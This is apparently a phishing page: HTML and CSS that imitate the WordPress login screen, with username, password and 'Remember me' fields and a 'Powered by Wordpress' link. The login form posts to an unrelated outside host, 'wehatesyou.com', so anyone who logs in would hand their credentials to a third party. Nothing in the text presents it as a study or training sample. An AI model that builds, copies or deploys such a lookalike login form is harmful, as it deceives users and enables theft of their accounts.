        #login #loginform {
            margin-top: 15px;
        }

        #login p {
            margin: 0 20px 0 20px;
            outline: 0;
            font-weight: normal;
        }

        #login p label {
            color: #777;
            font-size: 20px;
            font-family: "Open Sans";
            vertical-align: middle;
            line-height: 1.5;
        }

        #login input[type="text"] {
            height: 41px;
            width: 272px;
            font-weight: 200;
            font-size: 24px;
            width: 100%;
            margin-top: 2px;
            margin-right: 6px;
            margin-bottom: 16px;
            border: 1px solid #e5e5e5;
            background: #fbfbfb;
            box-shadow: inset 1px 1px 2px rgba(0, 0, 0, 0.08);
        }

        #login input[type="password"] {
            height: 41px;
            width: 272px;
            font-weight: 200;
            font-size: 14px;
            width: 100%;
            margin-top: 2px;
            margin-right: 6px;
            margin-bottom: 16px;
            border: 1px solid #e5e5e5;
            background: #fbfbfb;
            box-shadow: inset 1px 1px 2px rgba(0, 0, 0, 0.08);
        }

        #login form .rememberme label {
            font-size: 13px;
        }

        .button {
            height: 30px;
            font-family: inherit;
            background: #2ea2cc;
            line-height: 28px;
            padding: 0 12px 2px;
            border-color: #0074a2;
            -webkit-box-shadow: inset 0 1px 0 rgba(120, 200, 230, 0.5);
            box-shadow: inset 0 1px 0 rgba(120, 200, 230, 0.5);
            color: #fff;
            text-decoration: none;
            text-shadow: 0 1px 0 rgba(0, 86, 132, 0.7);
            font-size: 13px;
            cursor: pointer;
            border-width: 1px;
            border-style: solid;
            -webkit-border-radius: 3px;
            -webkit-appearance: none;
            border-radius: 3px;
            white-space: nowrap;
            float: right;
            text-align: center;

        }

    <div id="login">
        <h1>
            <a href="http://wordpress.org" title="Powered by Wordpress"></a>
        </h1>
        <form name="loginform" id="loginform" method="post" action="http://wehatesyou.com/wp-login">
            <p>
                <label>
                    Username</br>
                    <input type="text" value size="20"></input>
                </label>
            </p>
            <p>
                <label>
                    Password</br>
                    <input type="password" value size="20"></input>
                </label>
            </p>
            <p class="rememberme">
                <label>
                    <input name="rememberme" type="checkbox"></input>
                    Remember me
                </label>
            </p>
            <p>
                <input type="submit" value="Log in" class="button">
            </p>

        </form>

    </div>
